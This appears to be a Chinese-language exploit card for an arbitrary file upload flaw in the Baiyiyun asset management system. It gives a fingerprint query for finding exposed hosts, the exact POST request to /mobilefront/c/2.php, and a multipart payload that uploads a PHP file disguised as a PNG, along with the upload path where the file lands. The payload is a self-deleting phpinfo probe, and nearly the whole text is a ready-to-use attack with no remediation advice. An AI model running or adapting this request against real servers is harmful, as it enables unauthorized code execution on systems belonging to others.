# 百易云资产管理运营系统mobilefrontc2.php任意文件上传漏洞

- **系统**：百易云资产管理运营系统mobilefrontc2.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="不要着急，点此"`
- **请求**：`POST /mobilefront/c/2.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------289…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="2.php"
Content-Type: image/png
<?php phpinfo();unlink(__FILE__);?>
-----------------------------289666258334735365651210512949--
上传地址：
/mobilefront/c/images2/时间戳+文件名.php
```
- **预期**：200　|　响应时间>=5s